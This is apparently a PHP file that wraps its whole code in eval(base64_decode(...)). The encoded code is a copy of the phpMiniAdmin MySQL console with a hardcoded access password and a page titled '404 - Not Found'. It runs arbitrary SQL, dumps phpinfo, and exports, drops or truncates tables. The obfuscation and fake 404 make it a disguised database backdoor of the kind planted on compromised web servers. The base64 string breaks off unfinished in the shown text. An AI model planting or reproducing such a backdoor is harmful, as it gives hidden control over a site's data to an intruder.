<?PHP
eval(base64_decode("DQokQUNDRVNTX1BXRD0ndlBhc3N3b3JkJCc7ICMhISFJTVBPUlRBTlQhISEgdGhpcyBpcyBzY3JpcHQgYWNjZXNzIHBhc3N3b3JkLCBTRVQgSVQgaWYgeW91IHdhbnQgdG8gcHJvdGVjdCB5b3UgREIgZnJvbSBwdWJsaWMgYWNjZXNzDQoNCiNERUZBVUxUIGRiIGNvbm5lY3Rpb24gc2V0dGluZ3MNCiMgLS0tIFdBUk5JTkchIC0tLSBpZiB5b3Ugc2V0IGRlZmF1bHRzIC0gaXQncyByZWNvbW1lbmRlZCB0byBzZXQgJEFDQ0VTU19QV0QgdG8gcHJvdGVjdCB5b3VyIGRiIQ0KJERCREVGPWFycmF5KA0KJ3VzZXInPT4iIiwjcmVxdWlyZWQNCidwd2QnPT4iIiwgI3JlcXVpcmVkDQonZGInPT4iIiwgICNvcHRpb25hbCwgZGVmYXVsdCBEQg0KJ2hvc3QnPT4iIiwjb3B0aW9uYWwNCidwb3J0Jz0+IiIsI29wdGlvbmFsDQonY2hzZXQnPT4idXRmOCIsI29wdGlvbmFsLCBkZWZhdWx0IGNoYXJzZXQNCik7DQokSVNfQ09VTlQ9ZmFsc2U7ICNzZXQgdG8gdHJ1ZSBpZiB5b3Ugd2FudCB0byBzZWUgVG90YWwgcmVjb3JkcyB3aGVuIHBhZ2luYXRpb24gb2NjdXJzIChTTE9XUyBkb3duIGFsbCBzZWxlY3QgcXVlcmllcyEpDQokRFVNUF9GSUxFPWRpcm5hbWUoX19GSUxFX18pLicvcG1hZHVtcCc7ICNwYXRoIHRvIGZpbGUgd2l0aG91dCBleHRlbnNpb24gdXNlZCBmb3Igc2VydmVyLXNpZGUgZXhwb3J0cyAodGltZXN0YW1wLCAuc3FsLy5jc3YvLmd6IGV4dGVuc2lvbiBhZGRlZCkgb3IgaW1wb3J0cyguc3FsKQ0KZmlsZV9leGlzdHMoJGY9ZGlybmFtZShfX0ZJTEVfXykgLiAnL21zLnBocCcpJiZyZXF1aXJlKCRmKTsgLy8gUmVhZCBmcm9tIGNvbmZpZyAoZWFzaWVyIHRvIHVwZGF0ZSkNCmlmIChmdW5jdGlvbl9leGlzdHMoJ2RhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQnKSkgZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCgnVVRDJyk7I3JlcXVpcmVkIGJ5IFBIUCA1LjErDQoNCi8vY29uc3RhbnRzDQokVkVSU0lPTj0nMS45LjE3MDczMCc7DQokTUFYX1JPV1NfUEVSX1BBR0U9NTA7ICNtYXggbnVtYmVyIG9mIHJvd3MgaW4gc2VsZWN0IHBlciBvbmUgcGFnZQ0KJEQ9IlxyXG4iOyAjZGVmYXVsdCBkZWxpbWl0ZXIgZm9yIGV4cG9ydA0KJEJPTT1jaHIoMjM5KS5jaHIoMTg3KS5jaHIoMTkxKTsNCiRTSE9XX0Q9IlNIT1cgREFUQUJBU0VTIjsNCiRTSE9XX1Q9IlNIT1cgVEFCTEUgU1RBVFVTIjsNCiREQj1hcnJheSgpOyAjd29ya2luZyBjb3B5IGZvciBEQiBzZXR0aW5ncw0KDQokc2VsZj0kX1NFUlZFUlsnUEhQX1NFTEYnXTsNCg0Kc2Vzc2lvbl9zZXRfY29va2llX3BhcmFtcygwLCBudWxsLCBudWxsLCBmYWxzZSwgdHJ1ZSk7DQpzZXNzaW9uX3N0YXJ0KCk7DQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnWFNTJ10pKSAkX1NFU1NJT05bJ1hTUyddPWdldF9yYW5kX3N0cigxNik7DQokeHVybD0nWFNTPScuJF9TRVNTSU9OWydYU1MnXTsNCg0KaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLDApOyAgI3R1cm4gb24gdG8gZGVidWcgZGIgb3Igc2NyaXB0IGlzc3Vlcw0KZXJyb3JfcmVwb3J0aW5nKEVfQUxMIF4gRV9OT1RJQ0UpOw0KDQovL3N0cmlwIHF1b3RlcyBpZiB0aGV5IHNldA0KaWYgKGdldF9tYWdpY19xdW90ZXNfZ3BjKCkpew0KICAkX0NPT0tJRT1hcnJheV9tYXAoJ2tpbGxtcScsJF9DT09LSUUpOw0KICAkX1JFUVVFU1Q9YXJyYXlfbWFwKCdraWxsbXEnLCRfUkVRVUVTVCk7DQp9DQoNCmlmICgkX1JFUVVFU1RbJ2xvZ2luJ10pew0KICBpZiAoJF9SRVFVRVNUWydwd2QnXSE9JEFDQ0VTU19QV0Qpew0KICAgICRlcnJfbXNnPSJJbnZhbGlkIHBhc3N3b3JkLiBUcnkgYWdhaW4iOw0KICB9ZWxzZXsNCiAgICAkX1NFU1NJT05bJ2lzX2xvZ2dlZCddPXRydWU7DQogICAgbG9hZGNmZygpOw0KICB9DQp9DQoNCmlmICgkX1JFUVVFU1RbJ2xvZ29mZiddKXsNCiAgY2hlY2tfeHNzKCk7DQogICRfU0VTU0lPTiA9IGFycmF5KCk7DQogIHNhdmVjZmcoKTsNCiAgc2Vzc2lvbl9kZXN0cm95KCk7DQogICR1cmw9JHNlbGY7DQogIGlmICghJEFDQ0VTU19QV0QpICR1cmw9Jy8nOw0KICBoZWFkZXIoImxvY2F0aW9uOiAkdXJsIik7DQogIGV4aXQ7DQp9DQoNCmlmICghJF9TRVNTSU9OWydpc19sb2dnZWQnXSl7DQogIGlmICghJEFDQ0VTU19QV0QpIHsNCiAgICAkX1NFU1NJT05bJ2lzX2xvZ2dlZCddPXRydWU7DQogICAgbG9hZGNmZygpOw0KICB9ZWxzZXsNCiAgICBwcmludF9sb2dpbigpOw0KICAgIGV4aXQ7DQogIH0NCn0NCg0KaWYgKCRfUkVRVUVTVFsnc2F2ZWNmZyddKXsNCiAgY2hlY2tfeHNzKCk7DQogIHNhdmVjZmcoKTsNCn0NCg0KbG9hZHNlc3MoKTsNCg0KaWYgKCRfUkVRVUVTVFsnc2hvd2NmZyddKXsNCiAgcHJpbnRfY2ZnKCk7DQogIGV4aXQ7DQp9DQoNCi8vZ2V0IGluaXRpYWwgdmFsdWVzDQokU1FMcT10cmltKGI2NGQoJF9SRVFVRVNUWydxJ10pKTsNCiRwYWdlPSRfUkVRVUVTVFsncCddKzA7DQppZiAoJF9SRVFVRVNUWydyZWZyZXNoJ10gJiYgJERCWydkYiddICYmIHByZWdfbWF0Y2goJy9ec2hvdy8nLCRTUUxxKSApICRTUUxxPSRTSE9XX1Q7DQoNCmlmIChkYl9jb25uZWN0KCdub2RpZScpKXsNCiAgJHRpbWVfc3RhcnQ9bWljcm90aW1lX2Zsb2F0KCk7DQoNCiAgaWYgKCRfUkVRVUVTVFsncGknXSl7DQogICAgb2Jfc3RhcnQoKTtwaHBpbmZvKCk7JGh0bWw9b2JfZ2V0X2NsZWFuKCk7cHJlZ19tYXRjaCgiLzxib2R5W14+XSo+KC4qPyk8XC9ib2R5Pi9pcyIsJGh0bWwsJG0pOw0KICAgICRzcWxkcj0nPGRpdiBjbGFzcz0icGkiPicuJG1bMV0uJzwvZGl2Pic7DQogIH1lbHNlew0KICAgaWYgKCREQlsnZGInXSl7DQogICAgaWYgKCRfUkVRVUVTVFsnc2hleCddKXsNCiAgICAgcHJpbnRfZXhwb3J0KCk7DQogICAgfWVsc2VpZiAoJF9SRVFVRVNUWydkb2V4J10pew0KICAgICBjaGVja194c3MoKTtkb19leHBvcnQoKTsNCiAgICB9ZWxzZWlmICgkX1JFUVVFU1RbJ3NoaW0nXSl7DQogICAgIHByaW50X2ltcG9ydCgpOw0KICAgIH1lbHNlaWYgKCRfUkVRVUVTVFsnZG9pbSddKXsNCiAgICAgY2hlY2tfeHNzKCk7ZG9faW1wb3J0KCk7DQogICAgfWVsc2VpZiAoJF9SRVFVRVNUWydkb3NodCddKXsNCiAgICAgY2hlY2tfeHNzKCk7ZG9fc2h0KCk7DQogICAgfWVsc2VpZiAoISRfUkVRVUVTVFsncmVmcmVzaCddIHx8IHByZWdfbWF0Y2goJy9ec2VsZWN0fHNob3d8ZXhwbGFpbnxkZXNjL2knLCRTUUxxKSApew0KICAgICBpZiAoJFNRTHEpY2hlY2tfeHNzKCk7DQogICAgIGRvX3NxbCgkU1FMcSk7I3BlcmZvcm0gbm9uLXNlbGVjdCBTUUwgb25seSBpZiBub3QgcmVmcmVzaCAodG8gYXZvaWQgZGFuZ2Vyb3VzIGRlbGV0ZS9kcm9wKQ0KICAgIH0NCiAgIH1lbHNlew0KICAgIGlmICggJF9SRVFVRVNUWydyZWZyZXNoJ10gKXsNCiAgICAgICBjaGVja194c3MoKTtkb19zcWwoJFNIT1dfRCk7DQogICAgfWVsc2VpZiAoJF9SRVFVRVNUWydjcmRiJ10pew0KICAgICAgY2hlY2tfeHNzKCk7ZG9fc3FsKCdDUkVBVEUgREFUQUJBU0UgYCcuJF9SRVFVRVNUWyduZXdfZGInXS4nYCcpO2RvX3NxbCgkU0hPV19EKTsNCiAgICB9ZWxzZWlmICggcHJlZ19tYXRjaCgnL14oPzpzaG93XHMrKD86ZGF0YWJhc2VzfHN0YXR1c3x2YXJpYWJsZXN8cHJvY2Vzcyl8Y3JlYXRlXHMrZGF0YWJhc2V8Z3JhbnRccyspL2knLCRTUUxxKSApew0KICAgICAgIGNoZWNrX3hzcygpO2RvX3NxbCgkU1FMcSk7DQogICAgfWVsc2V7DQogICAgICAgJGVycl9tc2c9IlNlbGVjdCBEYXRhYmFzZSBmaXJzdCI7DQogICAgICAgaWYgKCEkU1FMcSkgZG9fc3FsKCRTSE9XX0QpOw0KICAgIH0NCiAgIH0NCiAgfQ0KICAkdGltZV9hbGw9Y2VpbCgobWljcm90aW1lX2Zsb2F0KCktJHRpbWVfc3RhcnQpKjEwMDAwKS8xMDAwMDsNCg0KICBwcmludF9zY3JlZW4oKTsNCn1lbHNlew0KICBwcmludF9jZmcoKTsNCn0NCg0KZnVuY3Rpb24gZG9fc3FsKCRxKXsNCiBnbG9iYWwgJGRiaCwkbGFzdF9zdGgsJGxhc3Rfc3FsLCRyZWNjb3VudCwkb3V0X21lc3NhZ2UsJFNRTHEsJFNIT1dfVDsNCiAkU1FMcT0kcTsNCg0KIGlmICghZG9fbXVsdGlfc3FsKCRxKSl7DQogICAgJG91dF9tZXNzYWdlPSJFcnJvcjogIi5teXNxbGlfZXJyb3IoJGRiaCk7DQogfWVsc2V7DQogICAgaWYgKCRsYXN0X3N0aCAmJiAkbGFzdF9zcWwpew0KICAgICAgICRTUUxxPSRsYXN0X3NxbDsNCiAgICAgICBpZiAocHJlZ19tYXRjaCgiL15zZWxlY3R8c2hvd3xleHBsYWlufGRlc2MvaSIsJGxhc3Rfc3FsKSkgew0KICAgICAgICAgIGlmICgkcSE9JGxhc3Rfc3FsKSAkb3V0X21lc3NhZ2U9IlJlc3VsdHMgb2YgdGhlIGxhc3Qgc2VsZWN0IGRpc3BsYXllZDoiOw0KICAgICAgICAgIGRpc3BsYXlfc2VsZWN0KCRsYXN0X3N0aCwkbGFzdF9zcWwpOw0KICAgICAgIH0gZWxzZSB7DQogICAgICAgICAkcmVjY291bnQ9bXlzcWxpX2FmZmVjdGVkX3Jvd3MoJGRiaCk7DQogICAgICAgICAkb3V0X21lc3NhZ2U9IkRvbmUuIjsNCiAgICAgICAgIGlmIChwcmVnX21hdGNoKCIvXmluc2VydHxyZXBsYWNlL2kiLCRsYXN0X3NxbCkpICRvdXRfbWVzc2FnZS49IiBMYXN0IGluc2VydGVkIGlkPSIuZ2V0X2lkZW50aXR5KCk7DQogICAgICAgICBpZiAocHJlZ19tYXRjaCgiL15kcm9wfHRydW5jYXRlL2kiLCRsYXN0X3NxbCkpIGRvX3NxbCgkU0hPV19UKTsNCiAgICAgICB9DQogICAgfQ0KIH0NCn0NCg0KZnVuY3Rpb24gZGlzcGxheV9zZWxlY3QoJHN0aCwkcSl7DQogZ2xvYmFsICRkYmgsJERCLCRzcWxkciwkcmVjY291bnQsJGlzX3NodCwkeHVybCwkaXNfc207DQogJHJjPWFycmF5KCJvIiwiZSIpOw0KICRkYm49dWUoJERCWydkYiddKTsNCiAkc3FsZHI9Jyc7DQoNCiAkaXNfc2hkPShwcmVnX21hdGNoKCcvXnNob3dccytkYXRhYmFzZXMvaScsJHEpKTsNCiAkaXNfc2h0PShwcmVnX21hdGNoKCcvXnNob3dccyt0YWJsZXN8XlNIT1dccytUQUJMRVxzK1NUQVRVUy8nLCRxKSk7DQogJGlzX3Nob3dfY3J0PShwcmVnX21hdGNoKCcvXnNob3dccytjcmVhdGVccyt0YWJsZS9pJywkcSkpOw0KDQogaWYgKCRzdGg9PT1GQUxTRSBvciAkc3RoPT09VFJVRSkgcmV0dXJuOyNjaGVjayBpZiAkc3RoIGlzIG5vdCBhIG15c3FsIHJlc291cmNlDQoNCiAkcmVjY291bnQ9bXlzcWxpX251bV9yb3dzKCRzdGgpOw0KICRmaWVsZHNfbnVtPW15c3FsaV9maWVsZF9jb3VudCgkZGJoKTsNCg0KICR3PScnOw0KIGlmICgkaXNfc20pICR3PSdzbSAnOw0KIGlmICgkaXNfc2h0IHx8ICRpc19zaGQpIHskdz0nd2EnOw0KICAgJHVybD0nPycuJHh1cmwuIiZkYj0kZGJuIjsNCiAgICRzcWxkci49IjxkaXYgY2xhc3M9J2RvdCc+DQogTXlTUUwgU2VydmVyOg0KICYjMTgzOyA8YSBocmVmPSckdXJsJnE9Ii5iNjR1KCJzaG93IHZhcmlhYmxlcyIpLiInPlNob3cgQ29uZmlndXJhdGlvbiBWYXJpYWJsZXM8L2E+DQogJiMxODM7IDxhIGhyZWY9JyR1cmwmcT0iLmI2NHUoInNob3cgc3RhdHVzIikuIic+U2hvdyBTdGF0aXN0aWNzPC9hPg0KICYjMTgzOyA8YSBocmVmPSckdXJsJnE9Ii5iNjR1KCJzaG93IHByb2Nlc3NsaXN0IikuIic+U2hvdyBQcm9jZXNzbGlzdDwvYT4gIjsNCiAgIGlmICgkaXNfc2hkKSAkc3FsZHIuPSImIzE4MzsgPGxhYmVsPkNyZWF0ZSBuZXcgZGF0YWJhc2U6IDxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSduZXdfZGInIHBsYWNlaG9sZGVyPSd0eXBlIGRiIG5hbWUgaGVyZSc+PC9sYWJlbD4gPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nY3JkYicgdmFsdWU9J0NyZWF0ZSc+IjsNCiAgICRzcWxkci49Ijxicj4iOw0KICAgaWYgKCRpc19zaHQpICRzcWxkci49IkRhdGFiYXNlOiAmIzE4MzsgPGEgaHJlZj0nJHVybCZxPSIuYjY0dSgic2hvdyB0YWJsZSBzdGF0dXMiKS4iJz5TaG93IFRhYmxlIFN0YXR1czwvYT4iOw0KICAgJHNxbGRyLj0iPC9kaXY+IjsNCiB9DQogaWYgKCRpc19zaHQpew0KICAgJGFidG49IjxkaXY+PGlucHV0IHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0V4cG9ydCcgb25jbGljaz1cInNodCgnZXhwJylcIj4NCiA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nRHJvcCcgb25jbGljaz1cImlmKGF5cygpKXtzaHQoJ2Ryb3AnKX1lbHNle3JldHVybiBmYWxzZX1cIj4NCiA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVHJ1bmNhdGUnIG9uY2xpY2s9XCJpZihheXMoKSl7c2h0KCd0cnVuYycpfWVsc2V7cmV0dXJuIGZhbHNlfVwiPg0KIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdPcHRpbWl6ZScgb25jbGljaz1cInNodCgnb3B0JylcIj4NCiA8Yj5zZWxlY3RlZCB0YWJsZXM8L2I+PC9kaXY+IjsNCiAgICRzcWxkci49JGFidG4uIjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2Rvc2h0JyB2YWx1ZT0nJz4iOw0KIH0NCg0KICRzcWxkci49IjxkaXY+PHRhYmxlIGlkPSdyZXMnIGNsYXNzPSdyZXMgJHcnPiI7DQogJGhlYWRlcnM9Ijx0ciBjbGFzcz0naCc+IjsNCiBpZiAoJGlzX3NodCkgJGhlYWRlcnMuPSI8dGQ+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBuYW1lPSdjYmFsbCcgdmFsdWU9Jycgb25jbGljaz0nY2hrYWxsKHRoaXMpJz48L3RkPiI7DQogZm9yKCRpPTA7JGk8JGZpZWxkc19udW07JGkrKyl7DQogICAgaWYgKCRpc19zaHQgJiYgJGk+MCkgYnJlYWs7DQogICAgJG1ldGE9bXlzcWxpX2ZldGNoX2ZpZWxkKCRzdGgpOw0KICAgICRoZWFkZXJzLj0iPHRoPjxkaXY+Ii5ocygkbWV0YS0+bmFtZSkuIjwvZGl2PjwvdGg+IjsNCiB9DQogaWYgKCRpc19zaGQpICRoZWFkZXJzLj0iPHRoPnNob3cgY3JlYXRlIGRhdGFiYXNlPC90aD48dGg+c2hvdyB0YWJsZSBzdGF0dXM8L3RoPjx0aD5zaG93IHRyaWdnZXJzPC90aD4iOw0KIGlmICgkaXNfc2h0KSAkaGVhZGVycy49Ijx0aD5lbmdpbmU8L3RoPjx0aD5+cm93czwvdGg+PHRoPmRhdGEgc2l6ZTwvdGg+PHRoPmluZGV4IHNpemU8L3RoPjx0aD5zaG93IGNyZWF0ZSB0YWJsZTwvdGg+PHRoPmV4cGxhaW48L3RoPjx0aD5pbmRleGVzPC90aD48dGg+ZXhwb3J0PC90aD48dGg+ZHJvcDwvdGg+PHRoPnRydW5jYXRlPC90aD48dGg+b3B0aW1pemU8L3RoPjx0aD5yZXBhaXI8L3RoPjx0aD5jb21tZW50PC90aD4iOw0KICRoZWFkZXJzLj0iPC90cj5cbiI7DQogJHNxbGRyLj0kaGVhZGVyczsNCiAkc3dhcHBlcj1mYWxzZTsNCiB3aGlsZSgkcm93PW15c3FsaV9mZXRjaF9yb3coJHN0aCkpew0KICAgJHNxbGRyLj0iPHRyIGNsYXNzPSciLiRyY1skc3dwPSEkc3dwXS4iJyBvbmNsaWNrPSd0Yyh0aGlzKSc+IjsNCiAgICR2PSRyb3dbMF07DQogICBpZiAoJGlzX3NodCl7DQogICAgICR2cT0nYCcuJHYuJ2AnOw0KICAgICAkdXJsPSc/Jy4keHVybC4iJmRiPSRkYm4mdD0iLmI2NHUoJHYpOw0KICAgICAkc3FsZHIuPSI8dGQ+PGlucHV0IHR5cGU9J2NoZWNrYm94JyBuYW1lPSdjYltdJyB2YWx1ZT1cIiIuaHMoJHZxKS4iXCI+PC90ZD4iDQogICAgIC4iPHRkPjxhIGhyZWY9XCIkdXJsJnE9Ii5iNjR1KCJzZWxlY3QgKiBmcm9tICR2cSIpLiJcIj4iLmhzKCR2KS4iPC9hPjwvdGQ+Ig0KICAgICAuIjx0ZD4iLmhzKCRyb3dbMV0pLiI8L3RkPiINCiAgICAgLiI8dGQgYWxpZ249J3JpZ2h0Jz4iLmhzKCRyb3dbNF0pLiI8L3RkPiINCiAgICAgLiI8dGQgYWxpZ249J3JpZ2h0Jz4iLmhzKCRyb3dbNl0pLiI8L3RkPiINCiAgICAgLiI8dGQgYWxpZ249J3JpZ2h0Jz4iLmhzKCRyb3dbOF0pLiI8L3RkPiINCiAgICAgLiI8dGQ+JiMxODM7PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoInNob3cgY3JlYXRlIHRhYmxlICR2cSIpLiJcIj5zY3Q8L2E+PC90ZD4iDQogICAgIC4iPHRkPiYjMTgzOzxhIGhyZWY9XCIkdXJsJnE9Ii5iNjR1KCJleHBsYWluICR2cSIpLiJcIj5leHA8L2E+PC90ZD4iDQogICAgIC4iPHRkPiYjMTgzOzxhIGhyZWY9XCIkdXJsJnE9Ii5iNjR1KCJzaG93IGluZGV4IGZyb20gJHZxIikuIlwiPmluZDwvYT48L3RkPiINCiAgICAgLiI8dGQ+JiMxODM7PGEgaHJlZj1cIiR1cmwmc2hleD0xJnJ0PSIuaHModWUoJHZxKSkuIlwiPmV4cG9ydDwvYT48L3RkPiINCiAgICAgLiI8dGQ+JiMxODM7PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoImRyb3AgdGFibGUgJHZxIikuIlwiIG9uY2xpY2s9J3JldHVybiBheXMoKSc+ZHI8L2E+PC90ZD4iDQogICAgIC4iPHRkPiYjMTgzOzxhIGhyZWY9XCIkdXJsJnE9Ii5iNjR1KCJ0cnVuY2F0ZSB0YWJsZSAkdnEiKS4iXCIgb25jbGljaz0ncmV0dXJuIGF5cygpJz50cjwvYT48L3RkPiINCiAgICAgLiI8dGQ+JiMxODM7PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoIm9wdGltaXplIHRhYmxlICR2cSIpLiJcIiBvbmNsaWNrPSdyZXR1cm4gYXlzKCknPm9wdDwvYT48L3RkPiINCiAgICAgLiI8dGQ+JiMxODM7PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoInJlcGFpciB0YWJsZSAkdnEiKS4iXCIgb25jbGljaz0ncmV0dXJuIGF5cygpJz5ycHI8L2E+PC90ZD4iDQogICAgIC4iPHRkPiIuaHMoJHJvd1skZmllbGRzX251bS0xXSkuIjwvdGQ+IjsNCiAgIH1lbHNlaWYgKCRpc19zaGQpew0KICAgICAkdXJsPSc/Jy4keHVybC4iJmRiPSIudWUoJHYpOw0KICAgICAkc3FsZHIuPSI8dGQ+PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoIlNIT1cgVEFCTEUgU1RBVFVTIikuIlwiPiIuaHMoJHYpLiI8L2E+PC90ZD4iDQogICAgIC4iPHRkPjxhIGhyZWY9XCIkdXJsJnE9Ii5iNjR1KCJzaG93IGNyZWF0ZSBkYXRhYmFzZSBgJHZgIikuIlwiPnNjZDwvYT48L3RkPiINCiAgICAgLiI8dGQ+PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoInNob3cgdGFibGUgc3RhdHVzIikuIlwiPnN0YXR1czwvYT48L3RkPiINCiAgICAgLiI8dGQ+PGEgaHJlZj1cIiR1cmwmcT0iLmI2NHUoInNob3cgdHJpZ2dlcnMiKS4iXCI+dHJpZzwvYT48L3RkPiI7DQogICB9ZWxzZXsNCiAgICAgZm9yKCRpPTA7JGk8JGZpZWxkc19udW07JGkrKyl7DQogICAgICAkdj0kcm93WyRpXTsNCiAgICAgIGlmIChpc19udWxsKCR2KSkgJHY9IjxpPk5VTEw8L2k+IjsNCiAgICAgIGVsc2VpZiAocHJlZ19tYXRjaCgnL1tceDAwLVx4MDlceDBCXHgwQ1x4MEUtXHgxRl0rLycsJHYpKXsjYWxsIGNoYXJzIDwzMiwgZXhjZXB0IFxuXHIoMEQwQSkNCiAgICAgICAkdmw9c3RybGVuKCR2KTskcGY9Jyc7DQogICAgICAgaWYgKCR2bD4xNiAmJiAkZmllbGRzX251bT4xKXsjc2hvdyBmdWxsIGR1bXAgaWYganVzdCBvbmUgZmllbGQNCiAgICAgICAgICR2PXN1YnN0cigkdiwgMCwgMTYpOyRwZj0nLi4uJzsNCiAgICAgICB9DQogICAgICAgJHY9J0JJTkFSWTogJy5jaHVua19zcGxpdChzdHJ0b3VwcGVyKGJpbjJoZXgoJHYpKSwyLCcgJykuJHBmOw0KICAgICAgfWVsc2UgJHY9aHMoJHYpOw0KICAgICAgaWYgKCRpc19zaG93X2NydCkgJHY9IjxwcmU+JHY8L3ByZT4iOw0KICAgICAgJHNxbGRyLj0iPHRkPjxkaXY+JHYiLighc3RybGVuKCR2KT8iPGJyPiI6JycpLiI8L2Rpdj48L3RkPiI7DQogICAgIH0NCiAgIH0NCiAgICRzcWxkci49IjwvdHI+XG4iOw0KIH0NCiAkc3FsZHIuPSI8L3RhYmxlPjwvZGl2PlxuIi4kYWJ0bjsNCn0NCg0KZnVuY3Rpb24gcHJpbnRfaGVhZGVyKCl7DQogZ2xvYmFsICRlcnJfbXNnLCRWRVJTSU9OLCREQiwkZGJoLCRzZWxmLCRpc19zaHQsJHh1cmwsJFNIT1dfVDsNCiAkZGJuPSREQlsnZGInXTsNCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+PHRpdGxlPjQwNCAtIE5vdCBGb3VuZDwvdGl0bGU+DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KKntib3gtc2l6aW5nOmJvcmRlci1ib3g7fQ0KYm9keXtmb250LWZhbWlseTpBcmlhbCxzYW5zLXNlcmlmO2ZvbnQtc2l6ZTo4MCU7cGFkZGluZzowO21hcmdpbjowfQ0KZGl2e3BhZGRpbmc6M3B4fQ0KcHJle2ZvbnQtc2l6ZToxMjUlfQ0KdGV4dGFyZWF7d2lkdGg6MTAwJX0NCi5uYXZ7dGV4dC1hbGlnbjpjZW50ZXJ9DQouZnR7dGV4dC1hbGlnbjpyaWdodDttYXJnaW4tdG9wOjIwcHg7Zm9udC1zaXplOnNtYWxsZXJ9DQouaW52e2JhY2tncm91bmQtY29sb3I6IzA2OTtjb2xvcjojRkZGfQ0KLmludiBhe2NvbG9yOiNGRkZ9DQp0YWJsZXtib3JkZXItY29sbGFwc2U6Y29sbGFwc2V9DQp0YWJsZS5yZXN7d2lkdGg6MTAwJX0NCnRhYmxlLndhe3dpZHRoOmF1dG99DQp0YWJsZS5yZXMgdGgsdGFibGUucmVzIHRke3BhZGRpbmc6MnB4O2JvcmRlcjoxcHggc29saWQgI2ZmZjt2ZXJ0aWNhbC1hbGlnbjp0b3B9DQp0YWJsZS5zbSB0aCx0YWJsZS5zbSB0ZHttYXgtd2lkdGg6MzBlbX0NCnRhYmxlLnNtIHRoPmRpdix0YWJsZS5zbSB0ZD5kaXZ7bWF4LWhlaWdodDozLjVlbTtvdmVyZmxvdzpoaWRkZW59DQp0YWJsZS5zbSB0aC5sZyx0YWJsZS5zbSB0ZC5sZ3ttYXgtd2lkdGg6aW5oZXJpdH0NCnRhYmxlLnNtIHRoLmxnPmRpdix0YWJsZS5zbSB0ZC5sZz5kaXZ7bWF4LWhlaWdodDppbmhlcml0O292ZXJmbG93OmluaGVyaXR9DQp0YWJsZS5yZXN0cnt2ZXJ0aWNhbC1hbGlnbjp0b3B9DQp0ci5le2JhY2tncm91bmQtY29sb3I6I0NDQ30NCnRyLm97YmFja2dyb3VuZC1jb2xvcjojRUVFfQ0KdHIuZTpob3ZlciwgdHIubzpob3ZlcntiYWNrZ3JvdW5kLWNvbG9yOiNGRjl9DQp0ci5oe2JhY2tncm91bmQtY29sb3I6Izk5Q30NCnRyLnN7YmFja2dyb3VuZC1jb2xvcjojRkY5fQ0KLmVycntjb2xvcjojRjMzO2ZvbnQtd2VpZ2h0OmJvbGQ7dGV4dC1hbGlnbjpjZW50ZXJ9DQouZnJte3dpZHRoOjQwMHB4O2JvcmRlcjoxcHggc29saWQgIzk5OTtiYWNrZ3JvdW5kLWNvbG9yOiNlZWU7dGV4dC1hbGlnbjpsZWZ0fQ0KLmZybSBsYWJlbCAubHt3aWR0aDoxMDBweDtmbG9hdDpsZWZ0fQ0KLmRvdHtib3JkZXItYm90dG9tOjFweCBkb3R0ZWQgIzAwMH0NCi5hamF4e3RleHQtZGVjb3JhdGlvbjpub25lO2JvcmRlci1ib3R0b206IDFweCBkYXNoZWR9DQoucW5hdnt3aWR0aDozMHB4fQ0KLnNidG57d2lkdGg6MTAwcHh9DQouY2xlYXJ7Y2xlYXI6Ym90aDtoZWlnaHQ6MDtkaXNwbGF5OmJsb2NrfQ0KLnBpIGF7dGV4dC1kZWNvcmF0aW9uOm5vbmV9DQoucGkgaHJ7ZGlzcGxheTpub25lfQ0KLnBpIGltZ3tmbG9hdDpyaWdodH0NCi5waSAuY2VudGVye3RleHQtYWxpZ246Y2VudGVyfQ0KLnBpIHRhYmxle21hcmdpbjowIGF1dG99DQoucGkgdGFibGUgdGQsIC5waSB0YWJsZSB0aHtib3JkZXI6MXB4IHNvbGlkICMwMDAwMDA7dGV4dC1hbGlnbjpsZWZ0O3ZlcnRpY2FsLWFsaWduOmJhc2VsaW5lfQ0KLnBpIHRhYmxlIC5le2JhY2tncm91bmQtY29sb3I6I2NjY2NmZjtmb250LXdlaWdodDpib2xkfQ0KLnBpIHRhYmxlIC52e2JhY2tncm91bmQtY29sb3I6I2NjY2NjY30NCjwvc3R5bGU+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCnZhciBMU0s9J3BtYV8nLExTS1g9TFNLKydtYXgnLExTS009TFNLKydtaW4nLHFjdXI9MCxMU01BWD0zMjsNCg0KZnVuY3Rpb24gJChpKXtyZXR1cm4gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaSl9DQpmdW5jdGlvbiBmcmVmcmVzaCgpew0KIHZhciBGPWRvY3VtZW50LkRGOw0KIEYubWV0aG9kPSdnZXQnOw0KIEYucmVmcmVzaC52YWx1ZT0iMSI7DQogRi5Hb1NRTC5jbGljaygpOw0KfQ0KZnVuY3Rpb24gZ28ocCxzcWwpew0KIHZhciBGPWRvY3VtZW50LkRGOw0KIEYucC52YWx1ZT1wOw0KIGlmKHNxbClGLnEudmFsdWU9c3FsOw0KIEYuR29TUUwuY2xpY2soKTsNCn0NCmZ1bmN0aW9uIGF5cygpew0KIHJldHVybiBjb25maXJtKCdBcmUgeW91IHN1cmUgdG8gY29udGludWU/Jyk7DQp9DQpmdW5jdGlvbiBjaGtzcWwoKXsNCiB2YXIgRj1kb2N1bWVudC5ERix2PUYucXJhdy52YWx1ZTsNCiBpZigvXlxzKig/OmRlbGV0ZXxkcm9wfHRydW5jYXRlfGFsdGVyKS8udGVzdCh2KSkgaWYoIWF5cygpKXJldHVybiBmYWxzZTsNC